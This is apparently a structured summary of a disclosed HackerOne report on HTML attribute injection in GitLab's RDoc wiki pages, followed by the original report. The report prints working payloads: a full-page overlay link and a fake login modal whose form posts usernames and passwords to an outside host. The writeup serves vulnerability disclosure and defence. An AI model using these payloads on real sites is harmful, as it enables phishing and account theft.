# Stored Cross-Site Scripting (XSS) in RDoc Wiki Pages via Unsanitized Image Link Attributes

## Metadata
- **Source:** HackerOne
- **Report:** 662287 | https://hackerone.com/reports/662287
- **Submitted:** 2019-07-28
- **Reporter:** vakzz
- **Program:** GitLab
- **Bounty:** Not specified in writeup
- **Severity:** high
- **Vuln:** Stored XSS, HTML Injection, Insufficient Input Sanitization
- **CVEs:** None
- **Category:** web-api

## Summary
GitLab's RDoc wiki parser failed to properly sanitize HTML attributes in image link syntax `{<img>}[link]`, allowing attackers to inject arbitrary HTML/CSS classes and create overlays or phishing forms. An attacker could trick users into submitting credentials or redirect clicks to malicious sites by leveraging real CSS classes like `atwho-view` and `select2-drop-mask` that position elements with high z-index.

## Attack scenario
1. Attacker creates a RDoc wiki page in a GitLab project with embedded HTML using image link syntax
2. Attacker injects CSS classes from the application's own stylesheet to create a full-page clickable overlay or modal dialog
3. Attacker designs the overlay to mimic GitLab's login form, requesting username and password
4. Legitimate users view the wiki page and see what appears to be a legitimate GitLab login prompt
5. Users enter credentials into the fake form, which submits to attacker's server via the `action` attribute
6. Attacker captures credentials and gains unauthorized access to user accounts

## Root cause
The RDoc parser in GitLab's wiki rendering engine did not properly sanitize or strip HTML attributes (class, target, href, action, etc.) when processing image link syntax. The sanitization logic only validated tag names but allowed arbitrary attributes through, and failed to strip dangerous attributes like 'class' that could be exploited with CSS to create overlays or invisible clickable areas.

## Attacker mindset
An attacker with access to create wiki pages (often any authenticated user) could weaponize this for credential harvesting, clickjacking, or reverse tabnabbing. The attack is particularly effective because it leverages the application's own CSS classes, making the malicious content appear legitimate and trustworthy to victims.

## Defensive takeaways
- Implement whitelist-based HTML sanitization for all markdown/wiki renderers, explicitly defining allowed tags and attributes
- Use established sanitization libraries (e.g., Rails Sanitize, DOMPurify) rather than custom parsers
- Never rely solely on tag-level validation; validate all attributes against a strict whitelist
- Apply Content Security Policy (CSP) headers to prevent inline CSS and script execution
- For external links, always include rel="noopener noreferrer" to prevent reverse tabnabbing
- Implement layered defenses: sanitization, CSP, and runtime protections
- Test wiki/markdown renderers specifically for attribute injection in image/link syntax
- Consider disallowing arbitrary HTML in user-generated content; use constrained markup instead

## Variant hunting
Check other markup renderers (Markdown, AsciiDoc) for similar attribute injection in link/image syntax
Test footnote/reference syntax for attribute passthrough
Look for other RDoc special syntax constructs that might bypass sanitization
Examine table syntax for similar injection vectors
Test nested markup combinations (e.g., links within emphasis) for sanitization bypass
Search for other instances where CSS classes are used for positioning/visibility that could be abused

## MITRE ATT&CK
- T1190
- T1566.002
- T1598.003
- T1539

## Notes
This is a high-impact vulnerability affecting WikiLab's core rendering engine. The attacker demonstrated two exploitation methods: clickjacking overlay and phishing modal form. The vulnerability was exploitable by any user with wiki creation/editing permissions. The writeup includes working proof-of-concept examples on live GitLab instances, demonstrating the practical exploitability. The root cause appears to be incomplete sanitization of the RDoc gem's output, likely in how GitLab configured or extended the gem. This vulnerability likely affected multiple versions of GitLab until proper sanitization was implemented site-wide.

## Full report
<details><summary>Expand</summary>

### Summary

When creating an RDoc wiki page it's possible to use a large number of html tags and attributes that are normally sanitized, when creating a linkable image of the format `{<img src>}[link]`

For example it is possible to specify a `class` attribute when creating an image link:

```rdoc
{
<a href='https://aw.rs/users/signin' class='atwho-view select2-drop-mask pika-select'>
<img height=10000 width=10000></a>
}[a]
```

will generate the following:

```html
<div class="md md-file">
  <p>Full Page link</p>
  <p><a href="a" rel="nofollow"></a><a href="https://aw.rs/users/signin" class="atwho-view select2-drop-mask pika-select" rel="nofollow"><img height="10000" width="10000"></a></p>
</div>
```

This will place a link taking over the entire page and intercept any clicks, `atwho-view select2-drop-mask pika-select` are just some real classes that make the links position absolute with a high z-index.

The `target` attribute could also be set to `_blank` and as there is no `rel="noopener"` [reverse tabnabbing](https://www.owasp.org/index.php/Reverse_Tabnabbing) is also possible.


Another attack that is more likely to work would be to create a form in a modal, which could be used to ask for a username and password:

```rdoc
a form
{
<div class="modal show d-block">
<div class="modal-dialog">
<div class="modal-content">
<div class="modal-header">
<h3 class="page-title">Please Log In</h3>
</div>
<div class="modal-body">
<form class="new-wiki-page" action="http://aw.rs/">
<div class="form-group">
<label for="username"><span>Username</span></label>
<input type="text" name="username" id="username" class="form-control">
<label for="password"><span>Password</span></label>
<input type="password" name="password" id="password" class="form-control">
</div>
<div class="form-actions"><button name="button" type="submit" class="btn btn-success">Login</button></div>
</form>
</div>
</div>
</div>
</div>
}[/]
```

Which produces the following dialog when viewing the page:
{F541421}


### Steps to reproduce

1. Create a wiki on gitlab
1. Add a new RDoc page with the above snippet
1. Save and wait for someone to click it


### Impact
An attacker could trick a user into thinking they had clicked on a gitlab element when they are actually redirected to the attackers site, or be presented with a dialog that will post to an attackers site.

### Examples

Example linking to a fake sign in form:
https://gitlab.com/wbowling/wiki/wikis/home

Example creating a modal form:
https://gitlab.com/wbowling/wiki/wikis/home2

### What is the current *bug* behavior?
When using an image link in RDoc the anchor tag attributes are not sanitized correctly.

### What is the expected *correct* behavior?
They should be correctly sanitized.

### Relevant logs and/or screenshots


### Output of checks

This bug happens on GitLab.com

#### Results of GitLab environment info
```
System information
System:		Ubuntu 16.04
Current User:	git
Using RVM:	no
Ruby Version:	2.6.3p62
Gem Version:	2.7.9
Bundler Version:1.17.3
Rake Version:	12.3.2
Redis Version:	3.2.12
Git Version:	2.21.0
Sidekiq Version:5.2.7
Go Version:	unknown

GitLab information
Version:	12.1.1
Revision:	f9abaa7d833
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.7
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	9.3.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git
```

## Impact

Trick users into giving up their account details via a legitimate looking form on gitlab.com

</details>

---
*Analysed by Claude on 2026-05-12*
